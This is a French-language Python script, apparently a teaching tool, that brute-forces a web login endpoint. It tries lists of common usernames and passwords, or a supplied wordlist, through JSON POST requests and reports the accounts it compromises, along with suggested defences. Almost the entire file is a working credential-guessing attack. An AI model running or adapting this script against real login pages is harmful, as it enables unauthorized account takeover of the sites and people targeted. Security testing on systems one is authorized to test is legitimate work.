#!/usr/bin/env python3
"""
Attaque Brute Force améliorée
Avec support Ngrok et analyse détaillée
"""

import requests
import time
from colorama import Fore, Style, init
from tqdm import tqdm
import json
from config import get_target_url, load_config

init(autoreset=True)

# Configuration
DELAY_BETWEEN_ATTEMPTS = 0.2  # Plus lent pour Ngrok

# Liste de mots de passe courants
COMMON_PASSWORDS = [
    "password", "123456", "12345678", "admin", "password123",
    "root", "test", "pass", "1234", "qwerty",
    "abc123", "letmein", "monkey", "dragon", "master",
    "welcome", "login", "admin123", "root123", "password1",
    "123", "Pass123", "admin1", "test123", "user",
    "caca", "azerty", "soleil", "marseille", "doudou", "pipi"
]

COMMON_USERNAMES = [
    "admin", "root", "user", "test", "administrator",
    "guest", "demo", "superadmin", "moderator", "testuser"
]


def banner():
    print(f"""
{Fore.RED}╔═══════════════════════════════════════════════════╗
║        🔨 BRUTE FORCE ATTACK SIMULATOR v2.0      ║
║              POUR TESTS PÉDAGOGIQUES              ║
╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}
""")


class BruteForceAnalyzer:
    """Analyse les résultats de l'attaque"""
    
    def __init__(self):
        self.total_attempts = 0
        self.successful_logins = []
        self.failed_attempts = 0
        self.error_count = 0
        self.start_time = None
        self.end_time = None
        self.response_times = []
    
    def add_attempt(self, username, password, success, response_time, error=False):
        """Ajoute une tentative"""
        self.total_attempts += 1
        self.response_times.append(response_time)
        
        if error:
            self.error_count += 1
        elif success:
            self.successful_logins.append({
                'username': username,
                'password': password,
                'attempts': self.total_attempts
            })
        else:
            self.failed_attempts += 1
    
    def print_summary(self):
        """Affiche le résumé"""
        elapsed = self.end_time - self.start_time if self.end_time else 0
        
        print(f"\n{Fore.CYAN}╔═══════════════ RÉSUMÉ DE L'ATTAQUE ═══════════════╗{Style.RESET_ALL}")
        
        print(f"\n{Fore.WHITE}⏱️  STATISTIQUES TEMPORELLES:{Style.RESET_ALL}")
        print(f"  • Durée totale: {elapsed:.2f}s")
        print(f"  • Tentatives: {self.total_attempts}")
        print(f"  • Vitesse: {self.total_attempts/elapsed:.2f} tentatives/s")
        
        if self.response_times:
            avg_time = sum(self.response_times) / len(self.response_times)
            print(f"  • Temps de réponse moyen: {avg_time*1000:.0f}ms")
        
        print(f"\n{Fore.WHITE}📊 RÉSULTATS:{Style.RESET_ALL}")
        print(f"  • Succès: {Fore.GREEN}{len(self.successful_logins)}{Style.RESET_ALL}")
        print(f"  • Échecs: {Fore.YELLOW}{self.failed_attempts}{Style.RESET_ALL}")
        print(f"  • Erreurs: {Fore.RED}{self.error_count}{Style.RESET_ALL}")
        
        if self.successful_logins:
            print(f"\n{Fore.GREEN}✓ COMPTES COMPROMIS:{Style.RESET_ALL}")
            for login in self.successful_logins:
                print(f"  • {Fore.GREEN}{login['username']}{Style.RESET_ALL} : {login['password']} "
                      f"(trouvé en {login['attempts']} tentatives)")
        
        # Analyse de sécurité
        print(f"\n{Fore.CYAN}🔐 ANALYSE DE SÉCURITÉ:{Style.RESET_ALL}")
        
        if len(self.successful_logins) > 0:
            print(f"  {Fore.RED}⚠️  VULNÉRABLE À BRUTE FORCE{Style.RESET_ALL}")
            print(f"  {Fore.RED}   → {len(self.successful_logins)} compte(s) craqué(s){Style.RESET_ALL}")
            print(f"\n  {Fore.YELLOW}Recommandations:{Style.RESET_ALL}")
            print(f"    • Implémenter un rate limiting")
            print(f"    • Ajouter un CAPTCHA après X tentatives")
            print(f"    • Bloquer l'IP après 5 échecs")
            print(f"    • Utiliser des mots de passe forts")
        else:
            print(f"  {Fore.GREEN}✓ Aucun compte compromis{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}   → Les mots de passe testés sont robustes{Style.RESET_ALL}")


def test_login(url, username, password, timeout=10):
    """Teste une combinaison username/password"""
    start_time = time.time()
    
    try:
        response = requests.post(
            url,
            json={"username": username, "password": password},
            headers={"Content-Type": "application/json"},
            timeout=timeout
        )
        
        response_time = time.time() - start_time
        
        if response.status_code == 200:
            try:
                data = response.json()
                success = data.get('success', False)
                return success, response_time, None
            except json.JSONDecodeError:
                return False, response_time, "Invalid JSON"
        else:
            return False, response_time, None
    
    except requests.exceptions.Timeout:
        return False, timeout, "Timeout"
    except requests.exceptions.ConnectionError:
        return False, 0, "Connection Error"
    except Exception as e:
        return False, 0, str(e)


def brute_force_single_user(url, username, passwords):
    """Attaque brute force sur un utilisateur spécifique"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║     🎯 ATTAQUE SUR UTILISATEUR UNIQUE            ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    print(f"\n{Fore.WHITE}Cible:{Style.RESET_ALL}")
    print(f"  • Username: {Fore.CYAN}{username}{Style.RESET_ALL}")
    print(f"  • Mots de passe à tester: {len(passwords)}")
    print(f"  • URL: {url}\n")
    
    analyzer = BruteForceAnalyzer()
    analyzer.start_time = time.time()
    
    for password in tqdm(passwords, desc=f"Test {username}", colour="red"):
        success, response_time, error = test_login(url, username, password)
        
        analyzer.add_attempt(username, password, success, response_time, error is not None)
        
        if success:
            print(f"\n{Fore.GREEN}[✓] MOT DE PASSE TROUVÉ !{Style.RESET_ALL}")
            print(f"{Fore.GREEN}    Username: {username}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}    Password: {password}{Style.RESET_ALL}")
            break
        
        if error:
            print(f"\n{Fore.RED}[!] Erreur: {error}{Style.RESET_ALL}")
            if error == "Connection Error":
                retry = input(f"{Fore.YELLOW}Continuer malgré l'erreur ? (o/n): {Style.RESET_ALL}")
                if retry.lower() not in ['o', 'oui', 'y', 'yes']:
                    break
        
        time.sleep(DELAY_BETWEEN_ATTEMPTS)
    
    analyzer.end_time = time.time()
    analyzer.print_summary()
    
    return analyzer


def brute_force_multiple_users(url, usernames, passwords):
    """Attaque brute force sur plusieurs utilisateurs"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║     🎯 ATTAQUE MULTI-UTILISATEURS                ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    print(f"\n{Fore.WHITE}Configuration:{Style.RESET_ALL}")
    print(f"  • Utilisateurs à tester: {len(usernames)}")
    print(f"  • Mots de passe par utilisateur: {len(passwords)}")
    print(f"  • Tentatives totales: {len(usernames) * len(passwords)}")
    print(f"  • URL: {url}\n")
    
    global_analyzer = BruteForceAnalyzer()
    global_analyzer.start_time = time.time()
    
    for username in usernames:
        print(f"\n{Fore.CYAN}[*] Test de l'utilisateur: {username}{Style.RESET_ALL}")
        
        found = False
        for password in tqdm(passwords, desc=f"  {username}", colour="yellow"):
            success, response_time, error = test_login(url, username, password)
            
            global_analyzer.add_attempt(username, password, success, response_time, error is not None)
            
            if success:
                print(f"\n{Fore.GREEN}  [✓] Trouvé: {username} / {password}{Style.RESET_ALL}")
                found = True
                break
            
            if error and error == "Connection Error":
                print(f"\n{Fore.RED}  [!] Erreur de connexion{Style.RESET_ALL}")
                break
            
            time.sleep(DELAY_BETWEEN_ATTEMPTS)
        
        if not found:
            print(f"{Fore.YELLOW}  [!] Aucun mot de passe trouvé pour {username}{Style.RESET_ALL}")
    
    global_analyzer.end_time = time.time()
    global_analyzer.print_summary()
    
    return global_analyzer


def custom_attack(url):
    """Attaque personnalisée avec wordlist"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║        🛠️  ATTAQUE PERSONNALISÉE                  ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    username = input(f"\n{Fore.WHITE}Username cible: {Style.RESET_ALL}")
    
    print(f"\n{Fore.WHITE}Source des mots de passe:")
    print("1. Liste par défaut")
    print("2. Fichier wordlist{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.CYAN}Choix (1/2): {Style.RESET_ALL}")
    
    if choice == "2":
        wordlist_path = input(f"{Fore.WHITE}Chemin du fichier: {Style.RESET_ALL}")
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[✓] {len(passwords)} mots de passe chargés{Style.RESET_ALL}")
        except FileNotFoundError:
            print(f"{Fore.RED}[✗] Fichier introuvable{Style.RESET_ALL}")
            return
    else:
        passwords = COMMON_PASSWORDS
    
    brute_force_single_user(url, username, passwords)


def main():
    banner()
    
    # Charger ou demander la configuration
    config = load_config()
    if not config:
        print(f"{Fore.YELLOW}[!] Aucune configuration trouvée{Style.RESET_ALL}")
        config = get_target_url()
    
    TARGET_URL = config['login_endpoint']
    
    print(f"\n{Fore.GREEN}[✓] Cible configurée: {TARGET_URL}{Style.RESET_ALL}")
    
    print(f"""
{Fore.WHITE}Sélectionnez le mode d'attaque:
1. Attaque sur un utilisateur (avec liste par défaut)
2. Attaque sur plusieurs utilisateurs
3. Attaque personnalisée (avec wordlist)
4. Quitter{Style.RESET_ALL}
""")
    
    choice = input(f"{Fore.CYAN}Votre choix (1-4): {Style.RESET_ALL}")
    
    if choice == "1":
        username = input(f"\n{Fore.WHITE}Username cible: {Style.RESET_ALL}")
        brute_force_single_user(TARGET_URL, username, COMMON_PASSWORDS)
    
    elif choice == "2":
        brute_force_multiple_users(TARGET_URL, COMMON_USERNAMES, COMMON_PASSWORDS)
    
    elif choice == "3":
        custom_attack(TARGET_URL)
    
    elif choice == "4":
        print(f"{Fore.CYAN}[*] Au revoir !{Style.RESET_ALL}")
    
    else:
        print(f"{Fore.RED}[✗] Choix invalide{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Attaque interrompue{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Erreur: {str(e)}{Style.RESET_ALL}")